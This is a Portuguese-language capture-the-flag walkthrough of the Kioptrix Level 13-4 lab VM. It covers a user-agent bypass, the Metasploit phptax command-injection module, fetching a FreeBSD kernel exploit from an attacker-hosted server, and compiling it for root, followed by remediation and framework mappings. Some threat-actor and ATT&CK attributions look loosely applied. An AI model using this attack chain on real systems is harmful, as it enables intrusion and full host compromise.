# Kioptrix: Level 1.3 / Level 13-4 — FreeBSD, phptax e um Kernel Que Já Viu Dias Melhores

Essa é selvagem demais, mano. Kioptrix Level 13-4 (às vezes rotulado erroneamente como "Level 1.3 #4") é na verdade uma fera completamente diferente do seu homônimo: roda FreeBSD 9.0 e hospeda uma aplicação PHP de declaração de impostos vulnerável (phptax) atrás de um serviço HTTP com controle de acesso por user-agent. Sem SQL injection dessa vez, sem escape de restricted shell. Em vez disso você tem injeção de comandos não autenticada via phptax e um exploit público de kernel para FreeBSD 9.0 que circula há anos. Progressão clássica de boot2root old-school, e totalmente subestimada em comparação com as entradas Linux do Kioptrix.

| Campo | Valor |
|---|---|
| **Nível** | Médio |
| **VM Alvo** | Kioptrix: Level 1.3 / Level 13-4 |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/kioptrix-level-13-4,25/ |
| **Técnicas** | Enumeração com Nmap, bypass de user-agent, descoberta do diretório phptax, RCE Metasploit phptax_exec, fetch FreeBSD para transferência de arquivo, compilação de exploit de kernel, escalação de privilégios via EDB-28718 |
| **CVEs** | CVE-2012-2208 (phptax Remote Code Execution), EDB-28718 (FreeBSD 9.0 Intel SYSRET Kernel Privilege Escalation), CWE-16 (Configuração: controle de acesso por user-agent) |
| **Grupos APT** | APT41: explora aplicações web mal configuradas e sem patch como vetores de acesso inicial em campanhas de targeting multi-setor; Lazarus Group: exploração documentada de plataformas OS em fim de vida incluindo variantes FreeBSD em ataques contra instituições financeiras |

---

## Resumo do Ataque

```
netdiscover / nmap
  → porta 80 (HTTP, página padrão)
  → porta 8080 (HTTP, 403 Forbidden)
  → spoofing de user-agent: MSIE 6.0 → bypass do 403 na 8080
  → diretório phptax/ descoberto
  → Metasploit: exploit/multi/http/phptax_exec (CVE-2012-2208)
  → shell de comandos → usuário de baixo privilégio (www ou nobody)
  → uname -a → FreeBSD 9.0-RELEASE
  → searchsploit FreeBSD 9.0 → EDB-28718
  → serve exploit via python3 -m http.server
  → alvo: fetch http://atacante/28718.c
  → gcc -o kernel 28718.c && chmod 777 kernel && ./kernel
  → uid=0(root)
  → cat /root/congrats.txt
```

---

## Metodologia

1. Descoberta de host e varredura completa de portas
2. Enumeração web na porta 80 e porta 8080
3. Bypass de user-agent para acessar conteúdo da porta 8080
4. Descoberta do diretório phptax e exploração RCE
5. Shell inicial como usuário de baixo privilégio
6. Fingerprinting do OS para versão do kernel
7. Busca no Exploit-DB por escalação de privilégio de kernel FreeBSD 9.0
8. Transferência de arquivo via utilitário fetch do FreeBSD
9. Compilar e executar exploit de kernel para root
10. Captura da flag

---

## Passo 1 — Descoberta de Host e Varredura de Portas

```bash
sudo netdiscover
# Alvo: 192.168.1.159

nmap -A 192.168.1.159
```

```
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Apache httpd 2.2.x
8080/tcp open  http     Apache httpd 2.2.x
```

Dois serviços HTTP. Porta 80 retorna uma página placeholder padrão. Porta 8080 retorna 403 Forbidden.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração Web e Bypass de User-Agent

Porta 80 mostra apenas um placeholder. Inspecione o código-fonte: nada útil.

Porta 8080 retorna 403 para todos os navegadores padrão. O servidor aplica uma verificação de user-agent. Faça bypass simulando um user-agent antigo do Internet Explorer:

```bash
curl -A "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" http://192.168.1.159:8080/
```

A resposta expõe um diretório `phptax/`, que é uma aplicação PHP de declaração fiscal com uma vulnerabilidade de execução remota de código publicamente conhecida.

**Abordagens alternativas:**
```bash
# Use extensão de navegador User Agent Switcher
# Ou configure user-agent customizado no proxy Burp Suite
# Ou use flag --user-agent do curl como mostrado acima
```

**Nota real:** Filtragem de user-agent é um mecanismo fraco de controle de acesso usado em aplicações web antigas para servir conteúdo diferente para diferentes navegadores. É trivialmente contornado porque o user-agent é um cabeçalho HTTP controlado pelo cliente. Em 2024, esse mesmo conceito se manifesta como controles de acesso baseados em IP que são contornados via injeção de cabeçalho X-Forwarded-For. Qualquer mecanismo de controle de acesso baseado em cabeçalhos fornecidos pelo cliente é inerentemente não confiável.

**MITRE ATT&CK:** T1592 — Coletar Informações do Host da Vítima; T1562.001 — Prejudicar Defesas: Desabilitar ou Modificar Ferramentas

---

## Passo 3 — RCE no phptax (CVE-2012-2208)

O phptax é uma aplicação PHP vulnerável com execução remota de código não autenticada:

```bash
msfconsole -q
msf> search phptax
msf> use exploit/multi/http/phptax_exec
msf> set RHOSTS 192.168.1.159
msf> set RPORT 8080
msf> exploit
```

Resultado: sessão de shell de comandos como usuário de baixo privilégio (`www` ou `nobody`).

Verifique o acesso:

```bash
id
# uid=80(www) gid=80(www)
whoami
# www
uname -a
# FreeBSD kioptrix2014 9.0-RELEASE FreeBSD 9.0-RELEASE #0 ...
```

**Como o CVE-2012-2208 funciona:** O phptax passa input fornecido pelo usuário para a função `passthru()` do PHP sem sanitização. O script `drawimage.php` aceita um parâmetro `pf` que é executado diretamente como um comando shell. Qualquer usuário não autenticado pode injetar comandos OS arbitrários.

**MITRE ATT&CK:** T1190 — Explorar Aplicação Voltada ao Público; T1059.004 — Interpretador de Comandos: Unix Shell

---

## Passo 4 — Fingerprinting do OS

Confirme a versão do OS para seleção de exploit:

```bash
uname -a
# FreeBSD kioptrix2014 9.0-RELEASE #0: Thu Aug 18 02:00:22 UTC 2011
```

FreeBSD 9.0-RELEASE chegou ao fim de vida em fevereiro de 2013. Múltiplos exploits públicos de escalação de privilégios existem para esta versão.

**MITRE ATT&CK:** T1082 — Descoberta de Informações do Sistema

---

## Passo 5 — Busca no Exploit-DB por Escalação de Privilégio de Kernel

Na máquina atacante:

```bash
searchsploit FreeBSD 9.0
```

```
FreeBSD 9.0 - Intel SYSRET Kernel Privilege Escalation | exploits/freebsd/local/28718.c
```

Copie o exploit:

```bash
searchsploit -m 28718
```

**Como o EDB-28718 funciona:** A instrução Intel SYSRET tem um comportamento conhecido quando executada com um endereço não-canônico. No FreeBSD 9.0, isso pode ser acionado por um usuário local para causar uma falha de proteção geral que o kernel trata incorretamente, resultando em escalação de privilégio para ring 0 (modo kernel), então uid=0.

**MITRE ATT&CK:** T1068 — Exploração para Escalação de Privilégios

---

## Passo 6 — Transferência de Arquivo via fetch do FreeBSD

Inicie um servidor HTTP na máquina atacante para servir o código-fonte do exploit:

```bash
python3 -m http.server 80
# Ou: python -m SimpleHTTPServer 80
```

No alvo, `wget` não está disponível no FreeBSD por padrão. Use o utilitário nativo `fetch`:

```bash
fetch http://192.168.1.108/28718.c
ls -la 28718.c
```

**Alternativa se fetch falhar:**
```bash
# Use curl se disponível no alvo:
curl -O http://192.168.1.108/28718.c

# Ou use ftp em modo passivo:
ftp -o 28718.c http://192.168.1.108/28718.c
```

**Nota real:** Conhecer os utilitários nativos de download para diferentes sistemas operacionais é crítico para transferência de arquivos durante pós-exploração. FreeBSD: `fetch`. Alpine Linux: `wget` pode não existir, use `curl`. Windows: `certutil`, `bitsadmin`, PowerShell Invoke-WebRequest. Essa lacuna de conhecimento derruba muitos pentesters que assumem que `wget` é universal, véi.

**MITRE ATT&CK:** T1105 — Transferência de Ferramenta de Ingresso

---

## Passo 7 — Compilar e Executar Exploit de Kernel

```bash
gcc -o kernel 28718.c
chmod 777 kernel
./kernel
```

Verifique root:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
whoami
# root
```

Leia a flag:

```bash
cd /root
ls
cat congrats.txt
```

(☞ﾟヮﾟ)☞ Root. Exploit de kernel cravado, mano! Sensacional demais!

**MITRE ATT&CK:** T1068 — Exploração para Escalação de Privilégios

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Usado Para |
|---|---|---|---|
| Shell inicial | www/nobody | phptax CVE-2012-2208 RCE | Execução de comandos na aplicação web |
| Exploit de kernel | EDB-28718 compilado | Bug Intel SYSRET FreeBSD 9.0 | Escalação de privilégio para root |
| Shell root | uid=0(root) | Execução do exploit de kernel | Acesso total ao sistema |
| Flag | congrats.txt | /root/ | Prova de comprometimento |

---

## Lições Aprendidas

| # | Descoberta | Relevância no Mundo Real | Takeaway Principal |
|---|---|---|---|
| 1 | Filtragem de user-agent como controle de acesso | Cabeçalhos controlados pelo cliente são sempre contornáveis; nenhuma aplicação de segurança no lado do cliente é confiável | Implemente autenticação real; nunca confie em user-agent, IP ou controle de acesso baseado em cabeçalho |
| 2 | RCE não autenticado no phptax via passthru() | Aplicações PHP legadas com execução direta de comandos OS são consistentemente exploradas | Remova aplicações legadas; valide todo input do usuário; use escapeshellarg() para qualquer execução de comandos |
| 3 | FreeBSD 9.0 em fim de vida desde 2013 | Rodar sistemas operacionais EOL significa que exploits de kernel publicamente conhecidos não têm patch disponível | Sempre execute versões de OS suportadas; implemente controles compensatórios se EOL não puder ser evitado |
| 4 | fetch substitui wget no FreeBSD | Pentesters que só conhecem wget falham em transferências de arquivo em alvos não-Linux | Aprenda os utilitários nativos de download para cada OS: fetch (FreeBSD), curl (maioria Unix), certutil/bitsadmin/IWR (Windows) |
| 5 | Exploit de kernel compilado no alvo | Alguns alvos têm GCC disponível para uso do atacante | Minimize ferramentas de desenvolvimento instaladas em servidores de produção; use imagens base mínimas |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Coletar Informações do Host da Vítima | T1592 |
| Acesso Inicial | Acesso Inicial | Explorar Aplicação Voltada ao Público | T1190 |
| Evasão de Defesa | Evasão | Bypass de User-Agent | T1562.001 |
| Execução | Execução | Interpretador de Comandos: Unix Shell | T1059.004 |
| Descoberta | Descoberta | Descoberta de Informações do Sistema | T1082 |
| Movimento Lateral | Transferência | Transferência de Ferramenta de Ingresso | T1105 |
| Escalação de Privilégios | Escalação | Exploração para Escalação de Privilégios | T1068 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Substitua o phptax**: Remova ou substitua a aplicação; valide e sanitize todo input do usuário; use `escapeshellarg()` para qualquer execução de comandos OS
2. **Implemente controle de acesso real**: Substitua filtragem de user-agent por autenticação; nunca confie em cabeçalhos fornecidos pelo cliente para decisões de acesso
3. **Atualize o FreeBSD**: Atualize para uma versão suportada do FreeBSD; aplique todos os patches de segurança; assine avisos de segurança do FreeBSD
4. **Remova GCC de servidores web**: Ferramentas de desenvolvimento em servidores de produção permitem compilação de exploit in-loco; use imagens base mínimas
5. **Aplique menor privilégio**: Processos de aplicações web devem rodar como usuário dedicado de baixo privilégio, não `www` ou `nobody` com acesso amplo ao sistema de arquivos

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todas as versões de OS em execução; sinalizar sistemas EOL |
| Proteger | Controle de Acesso | Implementar autenticação para serviços restritos; remover controle de acesso por user-agent |
| Proteger | Segurança de Plataforma | Atualizar para OS suportado; aplicar patches de segurança |
| Detectar | Anomalias | Alertar em padrões de injeção de comandos estilo phptax em logs web |
| Responder | Planejamento de Resposta | Isolar host comprometido; remover phptax; aplicar patch no OS |
| Recuperar | Planejamento de Recuperação | Reconstruir a partir de imagem OS suportada; auditar todas as aplicações web |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| SI-2 | Remediação de Falhas | Atualizar FreeBSD para versão suportada; aplicar patch no phptax |
| AC-17 | Acesso Remoto | Implementar autenticação real para serviços HTTP; remover controle de acesso por cabeçalho |
| CM-7 | Menor Funcionalidade | Remover GCC e ferramentas de desenvolvimento do servidor web |
| SI-3 | Proteção contra Malware | Implantar HIDS para detectar execução de exploit de kernel e mudanças incomuns de privilégio |

### CISA KEV

CVE-2012-2208 (RCE phptax) mapeia para a categoria de vulnerabilidades de aplicações web sem patch que a CISA consistentemente avisa via BOD 22-01. FreeBSD 9.0 EOL está alinhado com a orientação CISA sobre software não suportado. As organizações devem aplicar a orientação do Alerta CISA AA22-074A sobre redução de superfície de ataque de aplicações web.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Gerenciar Vulnerabilidades | MIL3 |
| Gestão de Ativos, Mudanças e Configuração (ASSET) | Gerenciar Inventário de Ativos de TI e OT | MIL2 |
| Consciência Situacional (SITUATION) | Realizar Logging | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Endurecimento de Configuração de Aplicação (autenticação real; remover filtragem de user-agent)
- **D3-OAM** — Gestão Administrativa do Sistema Operacional (atualizar OS EOL; remover ferramentas dev)
- **D3-WSAA** — Análise de Atividade de Sessão Web (detectar padrões de injeção phptax em logs de acesso)

---

## Considerações Finais

Kioptrix Level 13-4 é um ótimo lembrete de que nem todo CTF é Linux. Alvos FreeBSD requerem uma mentalidade ligeiramente diferente: fetch em vez de wget, layout de sistema de arquivos ligeiramente diferente e cadeias de exploit de kernel diferentes. O bypass de user-agent é um throwback divertido para a segurança web inicial, e a vulnerabilidade phptax é um exemplo clássico de por que `passthru()` com input não sanitizado é letal.

A máquina recompensa atacantes que leem fingerprints de OS cuidadosamente e conhecem seu caminho em alvos não-Linux. Impressionante que uma máquina rodando kernel FreeBSD 9.0 de 2011 ainda seja uma ferramenta de ensino relevante em 2024, véi.

Top demais essa máquina!

Thanks guys!! (❍ᴥ❍ʋ)
